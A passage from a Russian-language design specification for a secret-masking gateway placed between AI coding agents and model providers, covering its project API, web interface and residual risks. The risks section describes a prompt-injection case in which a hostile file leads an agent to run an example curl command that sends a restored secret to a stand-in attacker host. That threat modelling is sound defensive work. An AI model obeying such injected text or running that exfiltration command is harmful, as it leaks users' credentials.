  - Фрагмент OpenCode на странице ключа — `options.apiKey` (OpenCode шлёт его как `Authorization: Bearer ck_…`; шлюз принимает такой ключ и провайдеру его не передаёт), без `options.headers`. Модель и ключ во фрагментах Codex и SDK OpenAI экранируются (`json.dumps`).

## 15. API для проектов — `/api/v1` (FR-13)

JSON, ключ — `X-Cleaner-Key` (любой ключ, `upstream` не нужен). Тексты до `max_text_chars` (FR-2.1), файлы до `max_file_mb` (FR-2.2).

| Метод и путь | Что делает | Ответ |
|---|---|---|
| `POST /api/v1/chats` `{title?, label_style?, layers?}` | новый чат | `{id}` |
| `GET /api/v1/chats` | чаты владельца ключа | `[{id, title, updated_at}]` |
| `DELETE /api/v1/chats/{id}` | удалить (FR-1.4, без подтверждения — вызов и есть подтверждение) | 204 |
| `POST /api/v1/chats/{id}/texts` `{text, wait?}` | очистить текст | 200 `{item_id, status, deliverable, sanitized, replacements[{start,end,type,replacement}], notices[{code,start,end}], leaks, blocked}` (позиции — в исходном тексте; `sanitized` — только при `deliverable`) или 202 `{item_id, status}`, если не уложилось в `wait` (0–60 с, по умолчанию 30) |
| `POST /api/v1/chats/{id}/files` (multipart) | очистить файл (FR-2.2…2.9) | 202 `{item_id}` |
| `GET /api/v1/chats/{id}/items/{item_id}` | состояние и результат | как у `texts` |
| `POST /api/v1/chats/{id}/restore` `{text}` | восстановить ответ модели (FR-7) и сохранить его элементом чата | `{item_id, restored, counters, unknown[]}` |
| `GET /api/v1/chats/{id}/entities` | таблица соответствий (FR-1.6) | `[{id, type, replacements[], original, forms[], count}]` |
| `POST /api/v1/chats/{id}/rules` `{action: mask, item_id, value, type}` или `{action: unmask, value}` | правка распознавания (FR-6.2, 6.3); назначить замену можно только фрагменту, который есть в тексте `item_id` — как выделение на экране проверки | `{changed}` — сколько текстов изменилось |

- Тот же порядок, что в интерфейсе: очистка — задание в общем пуле, `deliverable` — по SEC-2 и FR-4.2; невыдаваемый результат приходит без `sanitized`.
- Проект, которому нужен разговор с моделью, а не только очистка, ходит в шлюз (`/agent/openai/v1/chat/completions` с ключом, у которого есть `upstream`) — это и есть «API для других проектов» в самом удобном виде: в SDK меняется только адрес.
- Ключ — заголовком `X-Cleaner-Key` или `Authorization: Bearer ck_…`.
- Ошибки — `{"error": {"code", "message"}}` с кодами 400/401/404/413/422/429; значения из запроса в сообщение не попадают.
- Текст из API — элемент чата с `source = 'program'`: в ленте «Текст из программы», в журнале очистки — тот же признак. Создание и удаление чата — события с `via: api`.
- Ключи выпускает и команда `cleaner apikey add <логин> --name <имя>` (ключ печатается один раз), `apikey list`, `apikey disable <id>` — для проектов, которые заводятся сценарием (моё решение).
- Как сделано планом 5А (28.10.2026): `POST …/files` отвечает 202 `{item_id, status}`; пустой текст и ответ — 422, длиннее `max_text_chars` — 413, файл больше `max_file_mb` — 413, без файла — 400; `wait` вне 0–60 — 422. Правка `rules` идёт, как на странице, через предпросмотр и правку для его версии чата; отказ правки (`EditRefused`) — 422 с его сообщением. Ответ модели из `restore` записывается элементом чата, как вставленный вручную. Элемент чужого чата, ответ модели вместо входного текста и чат, удалённый, пока текст ждал очереди, — 404. Пример клиента и проверка живого экземпляра — `scripts/api_smoke.py` (только стандартная библиотека, ключ — из `CLEANER_API_KEY`).

## 16. Веб-интерфейс

- **«Ключи»** (все пользователи): создать (имя, доступ к модели: нет / подключение и модели / подписка Claude / подписка ChatGPT — подписки только у администратора, слои 4 и 5), показать ключ один раз с фрагментами настройки агентов, список (имя, доступ, создан, последний запрос, запросов за сутки), отключить, «Начать заново» (новый чат шлюза).
- **Чат шлюза**: вместо ленты — журнал отправленного по сессиям и времени (вид блока, роль, размер, замены по типам); раскрытая запись — оригинал и ушедшее рядом, как экран проверки, только для чтения. Таблица соответствий и правки распознавания — как в обычном чате, с пометкой «действует на следующие запросы агента». Число замороженных блоков с открытым значением (7.3).
- **Журнал** (FR-11.3): новые виды событий `agent_send`, `agent_refused`, `api_*`, `key_created`, `key_disabled`.

## 17. Остаточные риски

1. **Внедрённые инструкции.** Модель, прочитавшая враждебный файл или страницу, может вызвать инструмент с меткой секрета в адресе (`curl https://evil.example/?k=<SECRET_1>`), и шлюз её восстановит — агент выполнит команду с настоящим секретом. Без Cleaner модель видела бы сам секрет и могла бы сделать то же: шлюз этот путь не открывает, но и не закрывает. Защита — подтверждение команд в самом агенте.
2. **Замороженная история.** Значение, которое слои пропустили при первой отправке, остаётся открытым во всех следующих запросах этой сессии.
3. **Служебные поля** (имена инструментов, `metadata`, идентификаторы модели) не очищаются: имя сервера MCP вида `mcp__example__…` уходит как есть. Проверка утечек их видит и при совпадении с известным значением отказывает — тогда сервер MCP переименовывается или значение открывается.
4. **Код.** Слои 1–3 настроены на тексты, журналы и конфигурации; на исходном коде возможны лишние замены, мешающие модели. Средство — список «никогда не скрывать» и замер на собственных репозиториях.
5. **Сосредоточение.** В базе Cleaner — оригиналы всех сессий агентов (шифрование — SEC-4, пределы — SEC-6). Записи агента (журналы сессий на машине агента) содержат оригиналы, как и без Cleaner.
6. **Подписки.** Токен подписки проходит через Cleaner в памяти. Anthropic запрещает сторонним разработчикам «посредничать» учётными данными claude.ai и пускать запросы через подписку «от имени своих пользователей»; при этом документация Claude Code сама описывает шлюзы, пересылающие запросы с подпиской. Условия входа через ChatGPT разрешают запросы «из локальной среды пользователя или удалённой, которой управляет только он» и запрещают делиться токенами. Свою подписку через свой сервер — по букве условий допустимо; подписка другого человека через сервер владельца — на границе, поэтому ключи с подпиской создают только администраторы (раздел 19).
7. **Изменения агентов.** Агенты обновляются часто, форматы тел меняются (Codex убрал `instructions` 05.10.2026). Незнакомое поле очищается как текст, незнакомый блок — тоже; это безопасно для утечек, но может сломать что-то, что провайдер ждёт дословно, — проверка в начале этапа и при обновлении агента.
